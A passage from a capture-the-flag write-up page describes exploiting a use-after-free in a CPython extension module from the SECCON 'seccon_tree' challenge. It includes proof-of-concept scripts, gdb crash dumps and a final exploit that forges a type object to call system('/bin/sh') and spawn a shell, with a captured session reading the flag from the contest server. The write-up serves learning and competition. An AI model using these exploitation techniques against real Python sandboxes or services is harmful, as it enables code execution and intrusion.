+<p>After creating the proof of concept it took me about three hours to get a shell. I made the mistake of treating this too much like a “normal” use-after-free scenario where you create a type confusion by allocating two different objects at the same location. For CPython this turned out to be impossible (or too hard) with <code class="language-plaintext highlighter-rouge">PyObject</code> types, as the interpreter dynamically deduces the types based on the <code class="language-plaintext highlighter-rouge">PyTypeObject</code> pointer, and as such there is no actually difference in behavior when operating on the value in two different contexts. For example:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">seccon_tree</span> <span class="kn">import</span> <span class="n">Tree</span>
+
+<span class="n">root</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">'x'</span><span class="p">)</span>
+
+<span class="n">dangling_ref</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">class</span> <span class="nc">X</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__del__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">global</span> <span class="n">dangling_ref</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Triggering UAF"</span><span class="p">)</span>
+        <span class="n">dangling_ref</span> <span class="o">=</span> <span class="n">root</span><span class="p">.</span><span class="n">get_child_left</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">():</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="n">X</span><span class="p">()))</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="bp">None</span><span class="p">))</span>
+
+<span class="n">trigger</span><span class="p">()</span>
+
+<span class="c1"># this seems to magically be allocated at the same spot as `dangling_ref`
+</span><span class="n">confusion</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> 
+<span class="k">print</span><span class="p">(</span><span class="n">dangling_ref</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">confusion</span><span class="p">)</span>
+<span class="nb">input</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>will yield:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@c19c5a5d3718:/exp<span class="nv">$ </span>./python3.9x poc.py 
+<span class="o">[</span>+] Triggering UAF
+b<span class="s1">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span>
+b<span class="s1">'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span>
+</code></pre></div></div>
+
+<p>After realizing this wasn’t going to work, I opted for trying to get a <code class="language-plaintext highlighter-rouge">bytearray</code> allocation at the same location as the freed <code class="language-plaintext highlighter-rouge">Tree</code> (which probably should have been my first idea anyway). With allocation I don’t mean the actual object, but rather where its contents are stored.</p>
+
+<p>Looking in <a href="https://github.com/python/cpython/blob/main/Include/cpython/bytearrayobject.h">Include/cpython/bytearrayobject.h</a>, this pointer is stored in the <code class="language-plaintext highlighter-rouge">ob_bytes</code> field of <code class="language-plaintext highlighter-rouge">PyByteArrayObject</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">PyObject_VAR_HEAD</span>
+    <span class="n">Py_ssize_t</span> <span class="n">ob_alloc</span><span class="p">;</span>   <span class="cm">/* How many bytes allocated in ob_bytes */</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">ob_bytes</span><span class="p">;</span>        <span class="cm">/* Physical backing buffer */</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">ob_start</span><span class="p">;</span>        <span class="cm">/* Logical start inside ob_bytes */</span>
+    <span class="n">Py_ssize_t</span> <span class="n">ob_exports</span><span class="p">;</span> <span class="cm">/* How many buffer exports */</span>
+<span class="p">}</span> <span class="n">PyByteArrayObject</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We’re lucky that <code class="language-plaintext highlighter-rouge">bytearray().__sizeof__() == 56</code> and <code class="language-plaintext highlighter-rouge">Tree(X()).__sizeof__() == 40</code>, so we can be fairly sure that the allocation of a <code class="language-plaintext highlighter-rouge">bytearray</code> itself will not inadvertedly get allocated at our target chunk.</p>
+
+<p>N.B: if you’re not very familiar with python, the <code class="language-plaintext highlighter-rouge">bytearray</code> object is a mutable version of the <code class="language-plaintext highlighter-rouge">bytes</code> object. This is useful, as the data is stored in a seperate buffer instead of just appended to the object iself. Additionally, we can change the contents of the buffer after the object has been allocated which might make our life easier.</p>
+
+<p>The following code will successfully allocate a buffer of null bytes at the location of <code class="language-plaintext highlighter-rouge">dangling_ref</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">seccon_tree</span> <span class="kn">import</span> <span class="n">Tree</span>
+
+<span class="n">root</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">'x'</span><span class="p">)</span>
+
+<span class="n">dangling_ref</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">class</span> <span class="nc">X</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__del__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">global</span> <span class="n">dangling_ref</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Triggering UAF"</span><span class="p">)</span>
+        <span class="n">dangling_ref</span> <span class="o">=</span> <span class="n">root</span><span class="p">.</span><span class="n">get_child_left</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">():</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="n">X</span><span class="p">()))</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="bp">None</span><span class="p">))</span>
+
+<span class="n">trigger</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">dangling_ref</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">dangling_ref</span><span class="p">)</span>
+<span class="nb">input</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@c19c5a5d3718:/exp<span class="nv">$ </span>./python3.9x poc.py 
+<span class="o">[</span>+] Triggering UAF
+&lt;seccon_tree.Tree object at 0x7f022ab05f00&gt;
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</code></pre></div></div>
+
+<p>And we get our segfault! Examining the crash in gdb:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  r poc.py 
+Starting program: /exp/python3.9x poc.py
+warning: Error disabling address space randomization: Operation not permitted
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[+] Triggering UAF
+&lt;seccon_tree.Tree object at 0x7f2166dccf00&gt;
+
+Program received signal SIGSEGV, Segmentation fault.
+PyObject_Str (v=0x7f2166dccf00) at ../Objects/object.c:463
+463	../Objects/object.c: No such file or directory.
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x00007f2166f9e740  →  0x00007f2166f9e740  →  [loop detected]
+$rbx   : 0x00000000014bd900  →  0x0000000000000000
+$rcx   : 0x0               
+$rdx   : 0x0               
+$rsp   : 0x00007ffc7f2e32f0  →  0x0000000000000001
+$rbp   : 0x00000000014bf300  →  0x0000000000000000
+$rsi   : 0x246             
+$rdi   : 0x00007f2166dccf00  →  0x0000000000000001
+$rip   : 0x00000000005f81a1  →  &lt;PyObject_Str+113&gt; cmp QWORD PTR [rcx+0x88], 0x0
+$r8    : 0x0               
+$r9    : 0x00000000014bdb80  →  0x00007f2166e588b0  →  0x00007f2166e5a1f0  →  0x00007f2166e56620  →  0x00007f2166e56670  →  0x00007f2166e566c0  →  0x00007f2166e5a2d0  →  0x00007f2166e56710
+$r10   : 0x8               
+$r11   : 0x00007ffc7f2e32d8  →  0x0000000000000000
+$r12   : 0x00007f2166dccf00  →  0x0000000000000001
+$r13   : 0x1               
+$r14   : 0x00000000015199f8  →  0x00007f2166ef74a0  →  0x0000000000000004
+$r15   : 0x00007f2166ef74a0  →  0x0000000000000004
+$eflags: [zero CARRY PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffc7f2e32f0│+0x0000: 0x0000000000000001	 ← $rsp
+0x00007ffc7f2e32f8│+0x0008: 0x00007f2166f9e740  →  0x00007f2166f9e740  →  [loop detected]
+0x00007ffc7f2e3300│+0x0010: 0x0000000000000000
+0x00007ffc7f2e3308│+0x0018: 0x00007f2166e4fea0  →  0x0000000000000001
+0x00007ffc7f2e3310│+0x0020: 0x00007f2166dccf00  →  0x0000000000000001
+0x00007ffc7f2e3318│+0x0028: 0x000000000065862f  →  &lt;PyFile_WriteObject+63&gt; mov r12, rax
+0x00007ffc7f2e3320│+0x0030: 0x0000000000000001
+0x00007ffc7f2e3328│+0x0038: 0x0000000000000000
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x5f818f &lt;PyObject_Str+95&gt; mov    rcx, QWORD PTR [r12+0x8]
+     0x5f8194 &lt;PyObject_Str+100&gt; cmp    rcx, 0x9590a0
+     0x5f819b &lt;PyObject_Str+107&gt; je     0x5f823a &lt;PyObject_Str+266&gt;
+ →   0x5f81a1 &lt;PyObject_Str+113&gt; cmp    QWORD PTR [rcx+0x88], 0x0
+     0x5f81a9 &lt;PyObject_Str+121&gt; je     0x4edaf3 &lt;PyObject_Str-1091133&gt;
+     0x5f81af &lt;PyObject_Str+127&gt; mov    rbp, QWORD PTR [rip+0x3adca2]        # 0x9a5e58 &lt;_PyRuntime+568&gt;
+     0x5f81b6 &lt;PyObject_Str+134&gt; mov    edi, DWORD PTR [rbp+0x20]
+     0x5f81b9 &lt;PyObject_Str+137&gt; mov    rsi, QWORD PTR [rbp+0x10]
+     0x5f81bd &lt;PyObject_Str+141&gt; add    edi, 0x1
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "python3.9x", stopped 0x5f81a1 in PyObject_Str (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x5f81a1 → PyObject_Str(v=0x7f2166dccf00)
+[#1] 0x65862f → PyFile_WriteObject(v=0x7f2166dccf00, f=&lt;optimized out&gt;, flags=&lt;optimized out&gt;)
+[#2] 0x640777 → builtin_print(self=&lt;optimized out&gt;, args=0x1519a00, nargs=0x1, kwnames=&lt;optimized out&gt;)
+[#3] 0x525c44 → cfunction_vectorcall_FASTCALL_KEYWORDS(func=0x7f2166ef74a0, args=0x1519a00, nargsf=&lt;optimized out&gt;, kwnames=&lt;optimized out&gt;)
+[#4] 0x599267 → _PyObject_VectorcallTstate(kwnames=0x0, nargsf=&lt;optimized out&gt;, args=0x1519a00, callable=0x7f2166ef74a0, tstate=0x14bf300)
+[#5] 0x599267 → PyObject_Vectorcall(kwnames=0x0, nargsf=&lt;optimized out&gt;, args=0x1519a00, callable=0x7f2166ef74a0)
+[#6] 0x599267 → call_function(kwnames=0x0, oparg=&lt;optimized out&gt;, pp_stack=&lt;synthetic pointer&gt;, tstate=0x14bf300)
+[#7] 0x599267 → _PyEval_EvalFrameDefault(tstate=&lt;optimized out&gt;, f=&lt;optimized out&gt;, throwflag=&lt;optimized out&gt;)
+[#8] 0x59734e → _PyEval_EvalFrame(throwflag=0x0, f=0x1519890, tstate=0x14bf300)
+[#9] 0x59734e → _PyEval_EvalCode(tstate=&lt;optimized out&gt;, _co=&lt;optimized out&gt;, globals=&lt;optimized out&gt;, locals=&lt;optimized out&gt;, args=&lt;optimized out&gt;, argcount=&lt;optimized out&gt;, kwnames=0x0, kwargs=0x0, kwcount=&lt;optimized out&gt;, kwstep=0x2, defs=0x0, defcount=&lt;optimized out&gt;, kwdefs=0x0, closure=0x0, name=0x0, qualname=0x0)
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+gef➤  telescope 0x7f2166dccf00
+0x00007f2166dccf00│+0x0000: 0x0000000000000001	 ← $rdi, $r12
+0x00007f2166dccf08│+0x0008: 0x0000000000000000
+0x00007f2166dccf10│+0x0010: 0x0000000000000000
+0x00007f2166dccf18│+0x0018: 0x0000000000000000
+0x00007f2166dccf20│+0x0020: 0x0000000000000000
+0x00007f2166dccf28│+0x0028: 0x0000000000000000
+0x00007f2166dccf30│+0x0030: 0x0000000000000001
+0x00007f2166dccf38│+0x0038: 0x0000000000958d20  →  0x0000000000000046 ("F"?)
+0x00007f2166dccf40│+0x0040: 0x0000000000000002
+0x00007f2166dccf48│+0x0048: 0xffffffffffffffff
+gef➤  
+</code></pre></div></div>
+
+<p>We’ve basically got the perfect primitive! Our 40 byte <code class="language-plaintext highlighter-rouge">bytearray</code> allocation is allocated exactly at the old address of the <code class="language-plaintext highlighter-rouge">Tree</code>, which we still have a reference to through our <code class="language-plaintext highlighter-rouge">dangling_ref</code>. Note that the first byte is <code class="language-plaintext highlighter-rouge">1</code> because of the fact that <code class="language-plaintext highlighter-rouge">print</code> increments the reference count of the object.</p>
+
+<p>Further exploitation is quite easy. We can overwrite the <code class="language-plaintext highlighter-rouge">PyObjectType</code> pointer of the <code class="language-plaintext highlighter-rouge">PyObject</code> to point to a buffer of arbitrary data. As a <code class="language-plaintext highlighter-rouge">PyObjectType</code> contains a bunch of function pointers, we should be able to easily get <code class="language-plaintext highlighter-rouge">rip</code> control. Even more fortunately, the (non-PIE) python executable links to <code class="language-plaintext highlighter-rouge">system</code>! Putting one and one together this shouldn’t be too bad. We forge the <code class="language-plaintext highlighter-rouge">tp_repr</code> pointer to point to <code class="language-plaintext highlighter-rouge">system</code>, and set the reference count of the associated object to <code class="language-plaintext highlighter-rouge">"/bin/sh;"</code>.</p>
+
+<p>The following code gets us a shell:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">seccon_tree</span> <span class="kn">import</span> <span class="n">Tree</span>
+
+<span class="n">root</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">'x'</span><span class="p">)</span>
+
+<span class="n">dangling_ref</span> <span class="o">=</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">p64</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">x</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">X</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__del__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">global</span> <span class="n">dangling_ref</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Triggering UAF"</span><span class="p">)</span>
+        <span class="n">dangling_ref</span> <span class="o">=</span> <span class="n">root</span><span class="p">.</span><span class="n">get_child_left</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">():</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="n">X</span><span class="p">()))</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="bp">None</span><span class="p">))</span>
+
+<span class="n">trigger</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">dangling_ref</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
+
+<span class="c1"># This is a bit messy but putting the constants in variables 
+# seems to do heap things.. which is not desirable.
+</span>
+<span class="c1"># 0x956900: pointer to the type of PyObjectType itself
+# 0x4214f0: pointer to the system routine
+</span>    
+<span class="n">r</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x956900</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">*</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4214F0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">*</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> 
+
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">r</span><span class="p">)))</span> <span class="c1"># print address of `r`
+</span>
+
+<span class="c1"># Overwrite refcount of dangling_ref to be ".bin/sh;"
+# repr will actually increase the reference count by one, so '.' + 1 = '/'
+</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s">".bin/sh;"</span>
+
+
+<span class="c1"># Set the PyObjectType pointer of dangling_ref to the values of `r` we declared above.
+# The values start 0x20 bytes into the PyBytes object.
+</span><span class="n">a</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>
+
+<span class="nb">repr</span><span class="p">(</span><span class="n">dangling_ref</span><span class="p">)</span> <span class="c1"># trigger system("/bin/sh;")
+</span></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@c19c5a5d3718:/exp$ ./python3.9x poc.py 
+[+] Triggering UAF
+&lt;seccon_tree.Tree object at 0x7f33add45ea0&gt;
+0x7f33ade125d0
+$ id
+uid=1000(user) gid=999(user) groups=999(user)
+$ 
+</code></pre></div></div>
+
+<p>Cool! Now comes the scary part, seeing whether this strategy is portable to the sandboxed environment.</p>
+
+<p>Luckily, there were only two problems I had to deal with:</p>
+
+<ul>
+  <li>The <code class="language-plaintext highlighter-rouge">class</code> keyword does not exist, so we can’t declare types conventionally</li>
+  <li><code class="language-plaintext highlighter-rouge">global</code> is not a permitted keyword</li>
+</ul>
+
+<p>We can overcome 1) with an overload of the <code class="language-plaintext highlighter-rouge">type</code> initializer. <code class="language-plaintext highlighter-rouge">type(name, bases, dict)</code> returns a new type, and we can specify members in <code class="language-plaintext highlighter-rouge">dict</code>.</p>
+
+<p>We can overcome 2) by just using a global mutable data structure instead, like a <code class="language-plaintext highlighter-rouge">list</code>.</p>
+
+<p>The final exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span> <span class="o">=</span> <span class="n">Tree</span><span class="p">(</span><span class="s">'x'</span><span class="p">)</span>
+<span class="n">dangling_ref</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="nb">bytearray</span> <span class="o">=</span> <span class="n">dbg</span><span class="p">.</span><span class="n">Bytearray</span>
+<span class="k">print</span> <span class="o">=</span> <span class="n">dbg</span><span class="p">.</span><span class="n">Print</span>
+<span class="nb">id</span> <span class="o">=</span> <span class="n">dbg</span><span class="p">.</span><span class="n">Id</span>
+<span class="nb">hex</span> <span class="o">=</span> <span class="n">dbg</span><span class="p">.</span><span class="n">Hex</span>
+<span class="nb">bytes</span> <span class="o">=</span> <span class="n">dbg</span><span class="p">.</span><span class="n">Bytes</span>
+
+<span class="k">def</span> <span class="nf">p64</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">x</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'little'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">delfunc</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="n">dbg</span><span class="p">.</span><span class="n">Print</span><span class="p">(</span><span class="s">"[+] Triggering UAF"</span><span class="p">)</span>
+    <span class="n">dangling_ref</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">root</span><span class="p">.</span><span class="n">get_child_left</span><span class="p">())</span>
+
+<span class="c1"># create our type in an unconventional manner
+# "a".__class__.__class__ corresponds to `type`
+</span><span class="n">X</span> <span class="o">=</span> <span class="s">"a"</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__class__</span><span class="p">(</span><span class="s">"X"</span><span class="p">,</span> <span class="p">(),</span> <span class="p">{</span><span class="s">"__del__"</span><span class="p">:</span><span class="n">delfunc</span><span class="p">})</span> 
+
+
+<span class="c1"># for some reason we now need to store this.. I'm not sure why
+</span><span class="n">z</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">():</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="n">X</span><span class="p">()))</span>
+    <span class="n">z</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">Tree</span><span class="p">(</span><span class="bp">None</span><span class="p">))</span>
+    <span class="n">root</span><span class="p">.</span><span class="n">add_child_left</span><span class="p">(</span><span class="n">z</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="n">trigger</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">dangling_ref</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+<span class="n">a</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
+
+<span class="c1"># This is a bit messy but putting the constants in variables 
+# seems to do heap things.. which is not desirable.
+</span>
+<span class="c1"># 0x956900: pointer to the type of PyObjectType itself
+# 0x4214f0: pointer to the system routine
+</span><span class="n">r</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x956900</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4214F0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">*</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># Print address of `r`
+</span><span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">r</span><span class="p">)))</span>
+
+<span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"/bin/sh;"</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">id</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>
+
+<span class="c1"># if we just call print on the whole list it seems like we don't have the refcount problem
+# print will call repr on the list, which will in turn call repr on every element  
+</span><span class="k">print</span><span class="p">(</span><span class="n">dangling_ref</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Note that you have to remove the comments in order to pass the check.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc seccon-tree.quals.seccon.jp 30001
+[Proof of Work]
+Submit the token generated by `hashcash -mb25 dekeqerfx`
+1:25:211214:dekeqerfx::WJ5uhR6NTxZ++3jN:00000000Xkev
+matched token: 1:25:211214:dekeqerfx::WJ5uhR6NTxZ++3jN:00000000Xkev
+check: ok
+Give me the source code url (where filesize &lt; 10000).
+Someone says that https://transfer.sh/ is useful if you don't have your own server
+http://REDACTED:8000/exp.py
+[+] Triggering UAF
+&lt;seccon_tree.Tree object at 0x7fad95b94180&gt;
+0x7fad95b8c300
+ls
+banned_word
+flag-2ed5991c0023b19e969ed2a7882a2d59
+run.py
+seccon_tree.cpython-39-x86_64-linux-gnu.so
+template.py
+cat flag*
+SECCON{h34p_m4n463m3n7_15_h4rd_f0r_hum4n5....}
+</code></pre></div></div>
+
+<p>Sure is, seeing how this bug was apparently unintended :p.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>I thought this was quite a nice challenge. I didn’t have any experience with CPython internally before this, so I learned a lot about the interpreter.</p>
+
+<p>We first-blooded this challenge about 6 hours into the CTF. I was surprised to see that the second solve was finally made about 16 hours into the CTF, as I didn’t think this was that hard of a challenge. Maybe the <code class="language-plaintext highlighter-rouge">find</code> bug was actually a lot harder to exploit?</p>
+
+<p>If the python binary would have had PIE, exploitation would be a bit harder, as you’d also have to leak libc or the executable base. I suppose you could leak values via the name or docstring field of the <code class="language-plaintext highlighter-rouge">PyTypeObject</code>though.</p>
+
+<p>Thanks to <a href="https://twitter.com/moratorium08">moratorium08</a> for the great challenge!</p>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
